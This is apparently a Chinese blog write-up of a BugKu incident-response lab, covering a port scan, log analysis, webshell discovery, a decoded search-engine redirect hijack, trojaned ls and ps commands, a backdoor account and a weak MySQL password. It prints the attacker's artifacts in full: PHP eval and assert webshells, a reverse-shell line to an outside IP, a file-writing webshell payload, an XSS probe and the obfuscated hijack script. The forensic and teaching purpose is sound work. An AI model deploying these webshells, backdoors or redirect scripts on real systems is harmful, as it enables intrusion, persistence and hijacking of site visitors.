---
title: "BugKu应急加固1"
description: "BugKu应急加固1-靶场题解感谢 BugKu 精彩的靶场"
date: 2025-05-15
tags:
  - "Bugku"
  - "应急响应"
  - "js劫持"
  - "命令篡改"
  - "bx"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "bugkuyg"          # 随机URL字符串
---


# BugKu -应急加固1-靶场题解
感谢 BugKu 精彩的靶场

[跳转提示](https://ctf.bugku.com/ctfplus/detail/id/2.html)

df

先基本端口扫描一下

```powershell
106.15.176.12 


❯ .\rustscan -a 106.15.176.12 -r 1-65535 -- -sC -sV -O
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "C:\\Users\\lenovo\\.rustscan.toml"
Open 106.15.176.12:22
Open 106.15.176.12:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -O" on ip 106.15.176.12
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-28 12:03 +0800
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
Initiating Ping Scan at 12:03
Scanning 106.15.176.12 [4 ports]
Completed Ping Scan at 12:03, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:03
Completed Parallel DNS resolution of 1 host. at 12:03, 4.56s elapsed
DNS resolution of 1 IPs took 4.62s. Mode: Async [#: 5, OK: 0, NX: 0, DR: 1, SF: 0, TR: 6, CN: 0]
Initiating SYN Stealth Scan at 12:03
Scanning 106.15.176.12 [2 ports]
Discovered open port 22/tcp on 106.15.176.12
Discovered open port 80/tcp on 106.15.176.12
Completed SYN Stealth Scan at 12:03, 0.04s elapsed (2 total ports)
Initiating Service scan at 12:03
Scanning 2 services on 106.15.176.12
Completed Service scan at 12:03, 6.11s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 106.15.176.12
Retrying OS detection (try #2) against 106.15.176.12
NSE: Script scanning 106.15.176.12.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 5.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.17s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
Nmap scan report for 106.15.176.12
Host is up, received echo-reply ttl 50 (0.028s latency).
Scanned at 2025-07-28 12:03:31 中国标准时间 for 16s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 49 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d8:18:8b:bd:33:d4:2c:75:13:48:23:dd:55:a3:13:34 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMpnDkBlbX+TGL8zHl1WXvHXS4+CYNl+Qm7vuprYZm3ooiTG+DetgrnYFXa3dEfipW6o41IMUVHI0PaQ96YdJa6JDdnJcMunGp3lqvZUhHUXOhix66iBFcVump/aD90jo4F1SvMDAqILO/7CxDrQZ5A8CReiOKB/q/Tgw+jLPwzfAAAAFQCz+CUru/J//xztKz7ZDsMSPgXtUwAAAIEAj7YHM5WPgFWhZ3Vnrs17avlWCF7F5vt6Ac7mmjua65acBwW2mAhw/ce5/0rp6nzqo3HrA/8+dmYejaj17xDtPfcaNLXM9WGkYITi+6ZHAklDiF543YVt3R8eXI8ndIVfd8xFeno2EcsPy9sLxeaNp8R3wvT4h2dzgZOzeE46CWUAAACAJYfIBifa7PKjKESCBeSxZyLMcPYxH3ZDRW3f+NTivsji8ls3pQO6rSBVPa2VSMOfXqWM/ysdwGqdu8AAujzcG8koEPj6o5hKX6piylPtN/2i9qxYQEz6xdgx8vK1L3oceMoKQ1LQZ8VSCBIYc6eb69oNjrHkwRbq5QnRRjNEBls=
|   2048 88:56:7d:9e:c5:8c:d2:f4:dd:7f:cb:47:96:1e:e7:11 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTRDqdRu3cMTnNGSstprcsXOJdauA7ZqI8GYmoi4w5CzAANcc83BcACUzMbyE2rh2nYZ+SKnpLwqF9HGS2JRlnurdDMMH1HMikgPVCVlGoJYsDV/2SlKvJwyP+s+Tb9FgxZTjOx/AzMzDSj8zxMa9fePxLRcl0KQmG/ACI7x3UWQRYlD+Db7anDqqimnoQxLmV3mK+HLbBHrgWh6BjPpvn/jsKr9CjAB5wgRcMNMBs+dbGUHGx/ynxYKBGkOxTcAasZTiJE1ocAmajfs4YaiAvKr1cUbee9+jPgcr6q1bWENaklkc/sXdoQhSfob2VyG0D8XZjdl8N/8OADcrdu5FF
|   256 9e:87:06:cb:ad:3c:08:24:4c:42:2e:86:a2:1b:77:2b (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHlvzIq2oW6A+qAtqZXmtkvTnaN3KF6v80Sw4viAKNA17zEaeC4wEFZRQELHRT7KG3SvYdEJZPsxd2lTEBtv9qM=
80/tcp open  http    syn-ack ttl 49 nginx 1.4.6 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/amanmin/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: F49C4A4BDE1EEC6C0B80C2277C76E3DB
|_http-title: xxxxxx\xE5\xAD\xA6\xE9\x99\xA2\xE4\xBA\x8C\xE6\x89\x8B\xE4\xBA\xA4\xE6\x98\x93\xE5\xB8\x82\xE5\x9C\xBA
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.4.6 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.11 - 4.9 (97%), Linux 3.10 - 4.11 (92%), Linux 3.13 - 4.4 (92%), Linux 3.2 - 4.14 (92%), Linux 3.8 - 3.16 (92%), Linux 3.2 - 3.8 (92%), Linux 3.2.0 (89%), Linux 3.13 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.97%E=4%D=7/28%OT=22%CT=%CU=%PV=Y%G=N%TM=6886F6A3%P=i686-pc-windows-windows)
SEQ(SP=103%GCD=1%ISR=109%TI=Z%II=I%TS=8)
SEQ(SP=103%GCD=1%ISR=10A%TI=Z%II=I%TS=8)
OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11NW7%O6=M578ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M578NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.005 days (since Mon Jul 28 11:55:52 2025)
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
Read data files from: D:\huanjing\nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds
           Raw packets sent: 74 (6.844KB) | Rcvd: 42 (15.407KB)
```

可以发现服务是使用的 Nginx



## 获取js劫持域名（带https）
访问这个域名，发现实现了一个跳转

```powershell
https://www.194nb.com/
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753675231558-1ac4a9fc-ef1b-427c-9d3b-23bdf8a4f173.png)

```powershell
flag{https://www.194nb.com/}
```



## 黑客首次首次 webshell 密码
```powershell
cd /var/log/nginx/
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753675907218-0e609a47-e521-4a50-8dfe-37a1d67b2dee.png)

可以分析出来是文件上传

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753675888781-bd8ad532-0c0a-466c-91eb-913a9038c990.png)

上面图片已经建立链接了，是通过这个`6127418cad73c.php`连接

查看文件

```powershell
<?php @eval($_POST['QjsvWsp6L84Vl9dRTTytVyn5xNr1']); ?>
```

得到密码

```javascript
QjsvWsp6L84Vl9dRTTytVyn5xNr1
```



## 黑客首次入侵方式（非有效）
继续日志分析

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753676182967-5b459d80-8607-4ed2-b306-7e0edc31f5f4.png)

锁定这个 IP

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753676299683-e34bc824-e1cb-4f8e-8c15-df2050f03128.png)

前面都是简单的弱口令，页面查看等操作

这一条进行了 XSS攻击

```powershell
goodid=57&content=<script>alert(1)</script>

xss
```



## 黑客服务器信息
就是看建立的网络连接和对应服务进程

查看系统信息，发现可疑

```powershell
ps -aux

--
#!/bin/bash
bash -i >& /dev/tcp/49.232.241.253/8888 0>&1
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753677382276-705aab1d-06e4-4bab-a97f-bdb79674666a.png)





## js 劫持域名
再分析的时候同时提前发现，js 劫持恶意代码

js 代码发现

```plain
@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "67482"."ab00b";echo @asenc($output);echo "adc"."86f";}ob_start();try{echo @fwrite(fopen(base64_decode(substr($_POST["gd001c8a00e577"],2)),"w"),base64_decode(substr($_POST["kbc380fd407a87"],2)))?"1":"0";;;}catch(Exception $e){echo "ERROR://".$e->getMessage();}asoutput();die();


QjsvWsp6L84Vl9dRTTytVyn5xNr1=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2267482%22.%22ab00b%22%3Becho%20%40asenc(%24output)%3Becho%20%22adc%22.%2286f%22%3B%7Dob_start()%3Btry%7Becho%20%40fwrite(fopen(base64_decode(substr(%24_POST%5B%22gd001c8a00e577%22%5D%2C2))%2C%22w%22)%2Cbase64_decode(substr(%24_POST%5B%22kbc380fd407a87%22%5D%2C2)))%3F%221%22%3A%220%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&gd001c8a00e577=RvL3Zhci93d3cvaHRtbC9hcHBsaWNhdGlvbi9ob21lL3ZpZXcvcHVibGljL2pzLmh0bWw%3D&kbc380fd407a87=dEPHNjcmlwdCBzcmM9Il9fU1RBVElDX19qcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJfX1NUQVRJQ19fanMvYW1hemV1aS5taW4uanMiPjwvc2NyaXB0Pg0KPHNjcmlwdCBzcmM9Il9fU1RBVElDX19qcy9pc2Nyb2xsLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJfX1NUQVRJQ19fanMvYW1hemV1aS5wYWdlLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJfX1NUQVRJQ19fanMvYXBwLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJfX1NUQVRJQ19fanMvYW1hbi5qcyI%2BPC9zY3JpcHQ%2BDQo8c2NyaXB0IHNyYz0iX19TVEFUSUNfXy9saWIvbGF5ZXIuanMiPjwvc2NyaXB0Pg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiID4NCiAgICBldmFsKGZ1bmN0aW9uKHAsYSxjLGssZSxkKXtlPWZ1bmN0aW9uKGMpe3JldHVybihjPGE%2FIiI6ZShwYXJzZUludChjL2EpKSkrKChjPWMlYSk%2BMzU%2FU3RyaW5nLmZyb21DaGFyQ29kZShjKzI5KTpjLnRvU3RyaW5nKDM2KSl9O2lmKCEnJy5yZXBsYWNlKC9eLyxTdHJpbmcpKXt3aGlsZShjLS0pZFtlKGMpXT1rW2NdfHxlKGMpO2s9W2Z1bmN0aW9uKGUpe3JldHVybiBkW2VdfV07ZT1mdW5jdGlvbigpe3JldHVybidcXHcrJ307Yz0xO307d2hpbGUoYy0tKWlmKGtbY10pcD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxiJytlKGMpKydcXGInLCdnJyksa1tjXSk7cmV0dXJuIHA7fSgnZCBlPS8uKEp8dXx2fHN8dHx5fHp8d3x4fHJ8bnxsfHF8cHxvKSguW2EtbS05Ly1dKyl7MSwyfS9OO2QgZj1nWyJcXExcXDVcXDdcXE1cXGlcXDBcXDZcXDMiXVsiXFw0XFwwXFxjXFwwXFw0XFw0XFwwXFw0Il07SChlWyJcXDNcXDBcXGtcXDMiXShmKSl7Z1siXFxBXFw1XFw3XFxEXFwzXFxHXFw1XFw2Il1bIlxcYlxcNFxcMFxcYyJdPSJcXGJcXDNcXDNcXElcXGtcXENcXGhcXGhcXDhcXDhcXDhcXGpcXEVcXEZcXEJcXDZcXEtcXGpcXDdcXDVcXGkifScsNTAsNTAsJ3g2NXx8fHg3NHx4NzJ8eDZmfHg2ZXx4NjN8eDc3fHx8eDY4fHg2Nnx2YXJ8WjF8VVVGSXJ6YXUyfHdpbmRvd3x4MmZ8eDZkfHgyZXx4NzN8MzYwfHowfHZuZXR8c3B8c218aW9hZ2V8MTE4MTE0fGJhaWR1fGdvb2dsZXxzb3xoYW9zb3V8YmluZ3xnb3Vnb3V8eW91ZGFvfHlhaG9vfHg2Y3x4MzR8eDNhfHg2MXx4MzF8eDM5fHg2OXxpZnx4NzB8c29nb3V8eDYyfHg2NHx4NzV8aWcnLnNwbGl0KCd8JyksMCx7fSkpDQoNCjwvc2NyaXB0Pg%3D%3D 
```

可以发现有俩个参数

```plain
gd001c8a00e577=RvL3Zhci93d3cvaHRtbC9hcHBsaWNhdGlvbi9ob21lL3ZpZXcvcHVibGljL2pzLmh0bWw=

&kbc380fd407a87=dEPHNjcmlwdCBzcmM9Il9fU1RBVElDX19qcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJfX1NUQVRJQ19fanMvYW1hemV1aS5taW4uanMiPjwvc2NyaXB0Pg0KPHNjcmlwdCBzcmM9Il9fU1RBVElDX19qcy9pc2Nyb2xsLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJfX1NUQVRJQ19fanMvYW1hemV1aS5wYWdlLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJfX1NUQVRJQ19fanMvYXBwLmpzIj48L3NjcmlwdD4NCjxzY3JpcHQgc3JjPSJfX1NUQVRJQ19fanMvYW1hbi5qcyI+PC9zY3JpcHQ+DQo8c2NyaXB0IHNyYz0iX19TVEFUSUNfXy9saWIvbGF5ZXIuanMiPjwvc2NyaXB0Pg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiID4NCiAgICBldmFsKGZ1bmN0aW9uKHAsYSxjLGssZSxkKXtlPWZ1bmN0aW9uKGMpe3JldHVybihjPGE/IiI6ZShwYXJzZUludChjL2EpKSkrKChjPWMlYSk+MzU/U3RyaW5nLmZyb21DaGFyQ29kZShjKzI5KTpjLnRvU3RyaW5nKDM2KSl9O2lmKCEnJy5yZXBsYWNlKC9eLyxTdHJpbmcpKXt3aGlsZShjLS0pZFtlKGMpXT1rW2NdfHxlKGMpO2s9W2Z1bmN0aW9uKGUpe3JldHVybiBkW2VdfV07ZT1mdW5jdGlvbigpe3JldHVybidcXHcrJ307Yz0xO307d2hpbGUoYy0tKWlmKGtbY10pcD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxiJytlKGMpKydcXGInLCdnJyksa1tjXSk7cmV0dXJuIHA7fSgnZCBlPS8uKEp8dXx2fHN8dHx5fHp8d3x4fHJ8bnxsfHF8cHxvKSguW2EtbS05Ly1dKyl7MSwyfS9OO2QgZj1nWyJcXExcXDVcXDdcXE1cXGlcXDBcXDZcXDMiXVsiXFw0XFwwXFxjXFwwXFw0XFw0XFwwXFw0Il07SChlWyJcXDNcXDBcXGtcXDMiXShmKSl7Z1siXFxBXFw1XFw3XFxEXFwzXFxHXFw1XFw2Il1bIlxcYlxcNFxcMFxcYyJdPSJcXGJcXDNcXDNcXElcXGtcXENcXGhcXGhcXDhcXDhcXDhcXGpcXEVcXEZcXEJcXDZcXEtcXGpcXDdcXDVcXGkifScsNTAsNTAsJ3g2NXx8fHg3NHx4NzJ8eDZmfHg2ZXx4NjN8eDc3fHx8eDY4fHg2Nnx2YXJ8WjF8VVVGSXJ6YXUyfHdpbmRvd3x4MmZ8eDZkfHgyZXx4NzN8MzYwfHowfHZuZXR8c3B8c218aW9hZ2V8MTE4MTE0fGJhaWR1fGdvb2dsZXxzb3xoYW9zb3V8YmluZ3xnb3Vnb3V8eW91ZGFvfHlhaG9vfHg2Y3x4MzR8eDNhfHg2MXx4MzF8eDM5fHg2OXxpZnx4NzB8c29nb3V8eDYyfHg2NHx4NzV8aWcnLnNwbGl0KCd8JyksMCx7fSkpDQoNCjwvc2NyaXB0Pg== 
```

<font style="color:rgb(31, 35, 40);">参数1 (gd001c8a00e577)：</font>

<font style="color:rgb(31, 35, 40);">去掉前两个混淆</font>

```plain
/var/www/html/application/home/view/public/js.html
```

<font style="color:rgb(31, 35, 40);">参数2 (kbc380fd407a87)：</font>

<font style="color:rgb(31, 35, 40);">解码后的内容是HTML/JavaScript代码：</font>

```javascript
<script src="__STATIC__js/jquery.min.js"></script>
  <script src="__STATIC__js/amazeui.min.js"></script>
  <script src="__STATIC__js/iscroll.js"></script>
  <script src="__STATIC__js/amazeui.page.js"></script>
  <script src="__STATIC__js/app.js"></script>
  <script src="__STATIC__js/aman.js"></script>
  <script src="__STATIC__/lib/layer.js"></script>
  <script type="text/javascript" >
  eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('d e=/.(J|u|v|s|t|y|z|w|x|r|n|l|q|p|o)(.[a-m-9/-]+){1,2}/N;d f=g["\\L\\5\\7\\M\\i\\0\\6\\3"]["\\4\\0\\c\\0\\4\\4\\0\\4"];H(e["\\3\\0\\k\\3"](f)){g["\\A\\5\\7\\D\\3\\G\\5\\6"]["\\b\\4\\0\\c"]="\\b\\3\\3\\I\\k\\C\\h\\h\\8\\8\\8\\j\\E\\F\\B\\6\\K\\j\\7\\5\\i"}',50,50,'x65|||x74|x72|x6f|x6e|x63|x77|||x68|x66|var|Z1|UUFIrzau2|window|x2f|x6d|x2e|x73|360|z0|vnet|sp|sm|ioage|118114|baidu|google|so|haosou|bing|gougou|youdao|yahoo|x6c|x34|x3a|x61|x31|x39|x69|if|x70|sogou|x62|x64|x75|ig'.split('|'),0,{}))

  </script>
```

<font style="color:rgb(31, 35, 40);">JavaScript去混淆</font>

<font style="color:rgb(31, 35, 40);">混淆的JavaScript代码解码后：</font>

```javascript
var e=/.*(baidu|google|so|haosou|bing|gougou|youdao|yahoo|sogou|360|vnet|sp|sm|ioage)(.([a-m0-9\/-]+){1,2}/ig;
var f=window["location"]["search"];
if(e["test"](f)){
  window["location"]["href"]="http://www.885zz0.vnet.cn/118114"
}
```

**<font style="color:rgb(31, 35, 40);">检测目标搜索引擎</font>**<font style="color:rgb(31, 35, 40);">：</font>

+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> </font>**<font style="color:rgb(31, 35, 40);">百度</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">(baidu)</font>
+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> </font>**<font style="color:rgb(31, 35, 40);">谷歌</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">(google)</font>
+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> </font>**<font style="color:rgb(31, 35, 40);">搜狗</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">(sogou)</font>
+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> </font>**<font style="color:rgb(31, 35, 40);">360搜索</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">(360)</font>
+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> </font>**<font style="color:rgb(31, 35, 40);">必应</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">(bing)</font>
+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> </font>**<font style="color:rgb(31, 35, 40);">好搜</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">(haosou)</font>
+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> </font>**<font style="color:rgb(31, 35, 40);">有道</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">(youdao)</font>
+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> </font>**<font style="color:rgb(31, 35, 40);">雅虎</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">(yahoo)</font>
+ <font style="color:rgb(31, 35, 40);">🌐</font><font style="color:rgb(31, 35, 40);"> 其他搜索引擎</font>

**<font style="color:rgb(31, 35, 40);">攻击流程</font>**<font style="color:rgb(31, 35, 40);">：</font>

1. <font style="color:rgb(31, 35, 40);">用户通过搜索引擎点击进入网站</font>
2. <font style="color:rgb(31, 35, 40);">JavaScript检测URL参数中是否包含搜索引擎标识</font>
3. <font style="color:rgb(31, 35, 40);">如果检测到，立即重定向到恶意网站</font><font style="color:rgb(31, 35, 40);"> </font>`<font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">www.885zz0.vnet.cn</font>`
4. <font style="color:rgb(31, 35, 40);">普通直接访问用户不受影响（隐蔽性强）</font>

<font style="color:rgb(31, 35, 40);"></font>

<font style="color:rgb(31, 35, 40);">这里对应最后一题</font>

<font style="color:rgb(31, 35, 40);">修的话就简单把后面删除就行</font>

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753683794164-0973d284-4f0f-45d5-bdfb-30519042c742.png)





## 黑客的 webshell2
> 这里学习到一点，就是利用 weblog 取证工具
>
> 十分方便，后续细聊
>

在<font style="color:rgb(77, 77, 77);">/var/www/html/public/static/img 目录下找到第二个 webshell</font>

```powershell
<?php $aa=_GET;@array_map(implode('',['a','s','s','e','r','t']),$$aa);  //flag{5t945bbwxokj87f1ucjb2vc7zdnf8ix3}?>
```

拿到 flag

```javascript
flag{5t945bbwxokj87f1ucjb2vc7zdnf8ix3}
```





## 黑客篡改的命令
就是去/bin 目录寻找可疑点

这个存在两处可疑点

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753684084582-f2da74a2-cfa0-4aef-97cb-5e21e9e5a6e6.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753684170368-a0980cfa-fdd4-49b2-baf9-2a3495d2f8ed.png)

查看文件吗，果然不对

```javascript
root@iZuf6hokkphbfaej57qch8Z:/bin# cat ls
#bin/bash
oldifs="$IFS"
IFS=$'\n'
result=$(ls2 $1 $2 $3)
for v in $result;
do
    echo -e "$v\t";
done
IFS="$oldifs"

echo "<?php \$aa="_GET";@array_map(implode('',['a','s','s','e','r','t']),\$\$aa);  //flag{5t945bbwxokj87f1ucjb2vc7zdnf8ix3}?>" > /var/www/html/public/static/img/1.php
```

再来看看`ps_`

```javascript
root@iZuf6hokkphbfaej57qch8Z:/bin# cat ps
#bin/bash
oldifs="$IFS"
IFS=$'\n'
result=$(ps_ $1 $2 $3 | grep -v 'threadd')
for v in $result;
do
     echo -e "$v\t";
done
IFS="$oldifs"
```



## 黑客的账号
查看`/etc/passwd`

这个账户很危险⚠️

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753684825403-af347af3-51ef-4b62-85bc-279638c33cd2.png)

删除账户,命令如下

```bash
sudo userdel -r aman
```





## Mysql 修复
> 这个我并不是太会，跟着文章复现的
>

一个弱口令进入

```javascript
root:123456
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753685031042-ba46f2b1-804b-489e-ba35-e890a5d6d960.png)

